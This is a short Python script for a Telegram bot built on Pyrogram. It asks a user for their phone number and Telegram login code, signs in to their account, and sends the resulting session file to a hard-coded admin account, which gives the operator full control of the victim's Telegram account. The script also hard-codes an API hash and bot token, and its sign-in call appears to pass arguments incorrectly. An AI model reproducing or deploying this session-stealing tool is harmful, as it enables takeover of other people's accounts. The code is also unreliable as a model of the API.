
from pyrogram import Client, filters
from pyrogram.types import Message
import os

API_ID = 23347107
API_HASH = "8193110bf32a08f41ac6e9050b2a4df4"
BOT_TOKEN = "7620884098:AAF8ObWhRQxsB0IXuFa_0bTWh5QQeE9dKmo"
ADMIN_ID = 7051377916

app = Client("bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

@app.on_message(filters.command("start") & filters.private)
async def start_cmd(client, message: Message):
    await message.reply("🤖 Bot is running!\nUse /send to create Telegram session.")

@app.on_message(filters.command("send") & filters.private)
async def send_cmd(client, message: Message):
    await message.reply("📱 Send phone number (e.g. +8801XXXXXXXXX)")
    phone_msg = await client.listen(message.chat.id)
    phone_number = phone_msg.text.strip().replace(" ", "").replace("-", "")

    session_filename = f"{SESSION_DIR}/{phone_number.replace('+', '')}.session"

    if os.path.exists(session_filename):
        await client.send_document(ADMIN_ID, document=session_filename, caption="✅ Session already exists!")
        await message.reply("📂 Session already exists. Sent to admin.")
        return

    user_client = Client(phone_number.replace("+", ""), api_id=API_ID, api_hash=API_HASH, workdir=SESSION_DIR)

    try:
        await user_client.connect()
        await user_client.send_code(phone_number)
        await message.reply("📩 OTP sent to Telegram. Now send the OTP:")

        otp_msg = await client.listen(message.chat.id)
        code = otp_msg.text.strip()

        await user_client.sign_in(phone_number, code)
        await user_client.disconnect()

        if os.path.exists(session_filename):
            await client.send_document(ADMIN_ID, document=session_filename, caption="✅ New session created!")
            await message.reply("✅ Session created and sent to admin.")
        else:
            await message.reply("❌ Session file not found!")

    except Exception as e:
        await message.reply(f"❌ Error: {e}")
        try:
            await user_client.disconnect()
        except:
            pass

app.run()
